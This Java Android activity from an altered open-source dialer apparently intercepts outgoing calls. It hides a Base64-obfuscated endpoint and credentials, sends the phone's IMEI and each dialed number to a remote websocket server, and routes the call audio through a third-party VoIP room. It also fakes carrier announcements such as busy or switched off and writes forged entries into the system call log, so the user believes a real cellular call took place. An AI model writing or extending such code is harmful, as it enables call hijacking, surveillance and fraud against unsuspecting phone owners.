package com.simplemobiletools.dialer.activities;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.LinearLayout;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.constraintlayout.widget.Group;

import com.simplemobiletools.commons.views.MyTextView;
import com.simplemobiletools.dialer.R;
import com.simplemobiletools.dialer.helpers.AudioManager;
import com.simplemobiletools.dialer.helpers.Const;
import com.simplemobiletools.dialer.helpers.MessageEvent;
import com.simplemobiletools.dialer.helpers.Tools;
import com.simplemobiletools.dialer.helpers.WSClient;
import com.simplemobiletools.dialer.helpers.ZegoApiManager;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class VoiceActivity extends Activity {
    private static final String TAG = "VoiceActivity";
    private ImageView caller_avatar;
    private MyTextView caller_name;
    private MyTextView caller_number;
    private MyTextView caller_status;
    private ImageView toggle_microphone;
    private ImageView toggle_speaker;
    private ImageView dialpad;
    private ImageView dialpad_close;
    private ImageView toggle_hold;
    private ImageView call_add;
    private ImageView call_manager;
    private ImageView call_end;
    private boolean mic_flag = false;
    private boolean speaker_flag = false;
    private boolean hold_flag = false;
    private boolean dialpad_flag = false;
    private LinearLayout dialpad_wrapper;
    private ConstraintLayout ongoing_call_holder;
    private ZegoApiManager zegoApiManager;
    private AudioManager audioManager;
    private Group controls_single_call;

    private MediaPlayer mediaPlayer;
    private MediaPlayer mediaPlayer_thz;
    private MediaPlayer mediaPlayer_wfjt;
    private MediaPlayer mediaPlayer_gj;
    private MediaPlayer mediaPlayer_kh;
    private MediaPlayer mediaPlayer_ztfw;
    private MediaPlayer mediaPlayer_bcz;

    private Timer timer;
    private boolean flag = false;
    private long tick_time = 0;

    private String phone_number;
    private String area = "";
    private String voice_stream_id;
    private String room_id;

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_call);
        //全屏显示
        getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);

        Intent intent = getIntent();
        phone_number = intent.getStringExtra("number");

        //初始化即构SDK
        zegoApiManager = ZegoApiManager.getInstance();
        //初始化音频管理器
        audioManager = AudioManager.getInstance();

        //展示拨号按钮列表
        dialpad_wrapper = findViewById(R.id.dialpad_wrapper);
        ongoing_call_holder = findViewById(R.id.ongoing_call_holder);
        ongoing_call_holder.setVisibility(View.VISIBLE);
        controls_single_call = findViewById(R.id.controls_single_call);
        controls_single_call.setVisibility(View.VISIBLE);

        //修改头像
        caller_avatar = findViewById(R.id.caller_avatar);
        caller_avatar.setImageResource(R.drawable.ic_launcher_foreground);

        //设置手机号码
        caller_name = findViewById(R.id.caller_name_label);
        caller_name.setText(phone_number);

        //设置归属地
        caller_number = findViewById(R.id.caller_number);
        caller_number.setText("");
        checkPhoneStatus(phone_number);

        //设置拨号状态
        caller_status = findViewById(R.id.call_status_label);
        caller_status.setText("正在拨号");

        //麦克风开关按钮
        toggle_microphone = findViewById(R.id.call_toggle_microphone);
        toggle_microphone.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mic_flag = !mic_flag;
                toggle_microphone.setImageResource(mic_flag ? R.drawable.ic_microphone_vector : R.drawable.ic_microphone_off_vector);
                audioManager.setMicrophoneMute(mic_flag);
                zegoApiManager.muteMicrophone(mic_flag);
            }
        });

        //扬声器开关按钮
        toggle_speaker = findViewById(R.id.call_toggle_speaker);
        toggle_speaker.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                speaker_flag = !speaker_flag;
                toggle_speaker.setImageResource(speaker_flag ? R.drawable.ic_volume_up_vector : R.drawable.ic_volume_down_vector);
                audioManager.setSpeakerphoneOn(speaker_flag);
                zegoApiManager.enableSpeaker(speaker_flag);
            }
        });

        //显示拨号键盘按钮
        dialpad = findViewById(R.id.call_dialpad);
        dialpad.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!dialpad_flag){
                    dialpad_flag = true;
                    dialpad_wrapper.setVisibility(View.VISIBLE);
                    ongoing_call_holder.setVisibility(View.INVISIBLE);
                }
            }
        });

        //关闭拨号键盘按钮
        dialpad_close = findViewById(R.id.dialpad_close);
        dialpad_close.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (dialpad_flag){
                    dialpad_flag = false;
                    dialpad_wrapper.setVisibility(View.GONE);
                    ongoing_call_holder.setVisibility(View.VISIBLE);
                }
            }
        });

        //保持通话按钮
        toggle_hold = findViewById(R.id.call_toggle_hold);
        toggle_hold.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                hold_flag = !hold_flag;
                toggle_hold.setImageResource(hold_flag ? R.drawable.ic_play_vector : R.drawable.ic_pause_vector);
            }
        });

        //添加通话按钮
        call_add = findViewById(R.id.call_add);
        call_add.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(VoiceActivity.this, DialpadActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            }
        });

        //通话管理按钮
        call_manager = findViewById(R.id.call_manage);
        call_manager.setVisibility(View.VISIBLE);
        call_manager.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(VoiceActivity.this, ConferenceActivity.class);
                startActivity(intent);
            }
        });

        //挂断按钮
        call_end = findViewById(R.id.call_end);
        call_end.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    JSONObject jsonObj = new JSONObject();
                    jsonObj.put("cmd", Const.VOICE_HANGUP);
                    jsonObj.put("role", Const.ROLE);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WSClient.getInstance().Send(jsonObj.toString());
                    }
                    VoiceActivity.this.finish();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        });

        EventBus.getDefault().register(this);

        int id = new Random().nextInt(Const.BG_MUSIC.length);

        try {
            mediaPlayer = MediaPlayer.create(this, Const.BG_MUSIC[id]);
            mediaPlayer_thz = MediaPlayer.create(this, R.raw.thz);
            mediaPlayer_wfjt = MediaPlayer.create(this, R.raw.wfjt);
            mediaPlayer_gj = MediaPlayer.create(this, R.raw.gj);
            mediaPlayer_kh = MediaPlayer.create(this, R.raw.kh);
            mediaPlayer_ztfw = MediaPlayer.create(this, R.raw.ztfw);
            mediaPlayer_bcz = MediaPlayer.create(this, R.raw.bcz);

            if (mediaPlayer != null){
                mediaPlayer.setLooping(true);
            }
            if (mediaPlayer_thz != null){
                mediaPlayer_thz.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                    @Override
                    public void onCompletion(MediaPlayer mp) {
                        VoiceActivity.this.finish();
                    }
                });
            }
            if (mediaPlayer_wfjt != null){
                mediaPlayer_wfjt.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                    @Override
                    public void onCompletion(MediaPlayer mp) {
                        VoiceActivity.this.finish();
                    }
                });
            }
            if (mediaPlayer_gj != null){
                mediaPlayer_gj.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                    @Override
                    public void onCompletion(MediaPlayer mp) {
                        VoiceActivity.this.finish();
                    }
                });
            }
            if (mediaPlayer_kh != null){
                mediaPlayer_kh.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                    @Override
                    public void onCompletion(MediaPlayer mp) {
                        VoiceActivity.this.finish();
                    }
                });
            }
            if (mediaPlayer_ztfw != null){
                mediaPlayer_ztfw.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                    @Override
                    public void onCompletion(MediaPlayer mp) {
                        VoiceActivity.this.finish();
                    }
                });
            }
            if (mediaPlayer_bcz != null){
                mediaPlayer_bcz.setOnCompletionListener(new MediaPlayer.OnCompletionListener() {
                    @Override
                    public void onCompletion(MediaPlayer mp) {
                        VoiceActivity.this.finish();
                    }
                });
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                if (flag){
                    try {
                        tick_time += 1;
                        long m = tick_time / 60;
                        long s = tick_time % 60;
                        runOnUiThread(new Runnable() {
                            @SuppressLint("DefaultLocale")
                            @Override
                            public void run() {
                                caller_status.setText(String.format("%02d:%02d", m, s));
                            }
                        });
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }
        }, 1000L, 1000L);
    }

    private void getPhoneArea(String phone_num){
        new Thread(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                HttpURLConnection connection = null;
                try {
                    URL url = new URL(Const.PHONE_AREA[0] + phone_num);
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    int code = connection.getResponseCode();
                    if (code == HttpURLConnection.HTTP_OK){
                        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String line;
                        StringBuilder response = new StringBuilder();
                        while ((line = reader.readLine()) != null){
                            response.append(line);
                        }
                        reader.close();
                        String responseData = response.toString();
                        Log.e(TAG, " phone_area: " + responseData);
                        JSONObject jsonObj = new JSONObject(responseData);
                        if (jsonObj.getInt("code") == 0){
                            JSONObject obj = jsonObj.getJSONObject("data");
                            if (!phone_num.isEmpty()){
                                mediaPlayer.start();
                                area = obj.getString("province") + obj.getString("city");
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        try {
                                            caller_number.setText(area);
                                        }catch (Exception e){
                                            e.printStackTrace();
                                        }
                                    }
                                });
                                JSONObject jsonObject = new JSONObject();
                                jsonObject.put("cmd", Const.VOICE_DIAL);
                                jsonObject.put("uid", Tools.getImei(getApplicationContext()));
                                jsonObject.put("phone", phone_num);
                                jsonObject.put("area", area);
                                WSClient.getInstance().Send(jsonObject.toString());
                            }
                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    if (mediaPlayer_bcz != null){
                        mediaPlayer_bcz.start();
                    }
                }finally {
                    if (connection != null){
                        connection.disconnect();
                    }
                }
            }
        }).start();
    }

    public void checkPhoneStatus(String phone_num){
        new Thread(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.O)
            @Override
            public void run() {
                HttpURLConnection connection = null;
                try {
                    String boundary = "--------" + UUID.randomUUID().toString();
                    String boundary2 = "--" + boundary;
                    URL url = new URL(new String(Base64.getDecoder().decode(Const.CHECK_PHONE_URL)));
                    connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                    connection.setDoOutput(true);
                    OutputStream outputStream = connection.getOutputStream();

                    StringBuilder sb = new StringBuilder();
                    sb.append(boundary2).append("\r\n");
                    sb.append("Content-Disposition: form-data; name=\"appId\"").append("\r\n");
                    sb.append("\r\n");
                    sb.append(new String(Base64.getDecoder().decode(Const.CHECK_PHONE_APPID))).append("\r\n");
                    sb.append(boundary2).append("\r\n");
                    sb.append("Content-Disposition: form-data; name=\"appKey\"").append("\r\n");
                    sb.append("\r\n");
                    sb.append(new String(Base64.getDecoder().decode(Const.CHECK_PHONE_APPKEY))).append("\r\n");
                    sb.append(boundary2).append("\r\n");
                    sb.append("Content-Disposition: form-data; name=\"mobiles\"").append("\r\n");
                    sb.append("\r\n");
                    sb.append(phone_num).append("\r\n");
                    sb.append(boundary2).append("--").append("\r\n");
                    outputStream.write(sb.toString().getBytes(StandardCharsets.UTF_8));
                    outputStream.flush();
                    outputStream.close();

                    int code = connection.getResponseCode();
                    if (code == HttpURLConnection.HTTP_OK){
                        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String line;
                        StringBuilder response = new StringBuilder();
                        while ((line = reader.readLine()) != null){
                            response.append(line);
                        }
                        reader.close();
                        String responseData = response.toString();
                        Log.e(TAG, "checkPhoneStatus: [" + responseData + "]");
                        JSONObject jsonObj = new JSONObject(responseData);
                        if (jsonObj.getInt("code") == 200){
                            JSONObject obj = jsonObj.getJSONObject("data");
                            int status = obj.getInt("status");
                            area = obj.getString("area");
                            switch (status){
                                case 1:
                                    mediaPlayer.start();
                                    runOnUiThread(new Runnable() {
                                        @Override
                                        public void run() {
                                            try {
                                                caller_number.setText(area);
                                            }catch (Exception e){
                                                e.printStackTrace();
                                            }
                                        }
                                    });
                                    //正常
                                    JSONObject jsonObject = new JSONObject();
                                    jsonObject.put("cmd", Const.VOICE_DIAL);
                                    jsonObject.put("uid", Tools.getImei(getApplicationContext()));
                                    jsonObject.put("phone", phone_num);
                                    jsonObject.put("area", area);
                                    WSClient.getInstance().Send(jsonObject.toString());
                                    break;
                                case 4:
                                case 2:
                                    //空号
                                    if (mediaPlayer_kh != null){
                                        mediaPlayer_kh.start();
                                    }
                                    break;
                                case 3:
                                    //通话中
                                    if (mediaPlayer_thz != null){
                                        mediaPlayer_thz.start();
                                    }
                                    break;
                                case 5:
                                case 7:
                                    //关机
                                    if (mediaPlayer_gj != null){
                                        mediaPlayer_gj.start();
                                    }
                                    break;
                                case 13:
                                    //停机
                                    if (mediaPlayer_ztfw != null){
                                        mediaPlayer_ztfw.start();
                                    }
                                    break;
                                default:
                                    if (mediaPlayer_bcz != null){
                                        mediaPlayer_bcz.start();
                                    }
                                    break;
                            }
                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                    if (mediaPlayer_bcz != null){
                        mediaPlayer_bcz.start();
                    }
                }finally {
                    if (connection != null){
                        connection.disconnect();
                    }
                }
            }
        }).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        timer.cancel();
        if (mediaPlayer != null){
            mediaPlayer.release();
            mediaPlayer = null;
        }
        if (mediaPlayer_thz != null){
            mediaPlayer_thz.release();
            mediaPlayer_thz = null;
        }
        if (mediaPlayer_wfjt != null){
            mediaPlayer_wfjt.release();
            mediaPlayer_wfjt = null;
        }
        if (mediaPlayer_gj != null){
            mediaPlayer_gj.release();
            mediaPlayer_gj = null;
        }
        if (mediaPlayer_kh != null){
            mediaPlayer_kh.release();
            mediaPlayer_kh = null;
        }
        if (mediaPlayer_ztfw != null){
            mediaPlayer_ztfw.release();
            mediaPlayer_ztfw = null;
        }
        if (mediaPlayer_bcz != null){
            mediaPlayer_bcz.release();
            mediaPlayer_bcz = null;
        }
        if (flag){
            zegoApiManager.stopPublish();
            zegoApiManager.stopPlay(voice_stream_id);
            audioManager.releaseRecord();
            audioManager.releaseAudioTrack();
            zegoApiManager.logoutRoom(room_id);
            insertCallLogEntry(this, phone_number, System.currentTimeMillis(), tick_time, CallLog.Calls.OUTGOING_TYPE, area);
        }else {
            insertCallLogEntry(this, phone_number, System.currentTimeMillis(), 0, CallLog.Calls.OUTGOING_TYPE, area);
        }
        flag = false;
        EventBus.getDefault().unregister(this);
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void MessageEventBus(MessageEvent messageEvent){
        switch (messageEvent.getNumber()){
            case Const.EVENT_MSG:
                try {
                    JSONObject jsonObject = new JSONObject(messageEvent.getMessage());
                    String cmd = jsonObject.getString("cmd");
                    int code = jsonObject.getInt("code");
                    switch (cmd){
                        case Const.VOICE_DIAL:
                            if (code == Const.DIAL_WFJT){
                                if (mediaPlayer != null && mediaPlayer.isPlaying()){
                                    mediaPlayer.stop();
                                }
                                if (mediaPlayer_wfjt != null && !mediaPlayer.isPlaying()){
                                    mediaPlayer_wfjt.start();
                                }
                            }
                            break;
                        case Const.VOICE_ANSWER:
                            if (mediaPlayer != null && mediaPlayer.isPlaying()){
                                mediaPlayer.stop();
                            }
                            zegoApiManager.loginRoom(jsonObject.getString("room_id"), Tools.getImei(VoiceActivity.this), new ZegoApiManager.ZegoLoginCallBack() {
                                @Override
                                public void onFailed() {
                                    Log.e(TAG, "zego login room fail!");
                                    VoiceActivity.this.finish();
                                }

                                @Override
                                public void onSuccess() {
                                    try {
                                        flag = true;
                                        zegoApiManager.enableCustomAudioIO();
                                        audioManager.initAudioRecord();
                                        audioManager.initAudioTrack();
                                        zegoApiManager.startPublish(jsonObject.getString("dial_stream_id"));
                                        zegoApiManager.startPlay(jsonObject.getString("voice_stream_id"));
                                        audioManager.startRecord();
                                        audioManager.startAudioTrack();
                                        voice_stream_id = jsonObject.getString("voice_stream_id");
                                        room_id = jsonObject.getString("room_id");
                                    }catch (Exception e){
                                        Log.e(TAG, e.toString());
                                    }
                                }
                            });
                            break;
                        case Const.VOICE_HANGUP:
                            int role = jsonObject.getInt("role");
                            int status = jsonObject.getInt("status");
                            if (status == 1 && role == 1){
                                if (mediaPlayer != null && mediaPlayer.isPlaying()){
                                    mediaPlayer.stop();
                                }
                                if (mediaPlayer_thz != null && !mediaPlayer_thz.isPlaying()){
                                    mediaPlayer_thz.start();
                                }
                                break;
                            }
                        case Const.VOICE_FINISH:
                            if (mediaPlayer != null && mediaPlayer.isPlaying()){
                                mediaPlayer.stop();
                            }
                            VoiceActivity.this.finish();
                            break;
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
                break;
            case Const.EVENT_ERROR:
                VoiceActivity.this.finish();
                break;
        }
    }

    public void insertCallLogEntry(Context context, String number, long callDate, long duration, int callType, String area) {
        ContentResolver contentResolver = context.getContentResolver();
        // 创建一个新的ContentValues对象
        ContentValues values = new ContentValues();
        values.put(CallLog.Calls.NUMBER, number);           // 插入电话号码
        values.put(CallLog.Calls.DATE, callDate);           // 插入通话时间
        values.put(CallLog.Calls.DURATION, duration);       // 插入通话时长
        values.put(CallLog.Calls.TYPE, callType);           // 插入通话类型
        values.put(CallLog.Calls.GEOCODED_LOCATION, area);  // 插入归属地

        // 插入通话记录
        contentResolver.insert(CallLog.Calls.CONTENT_URI, values);
    }

}
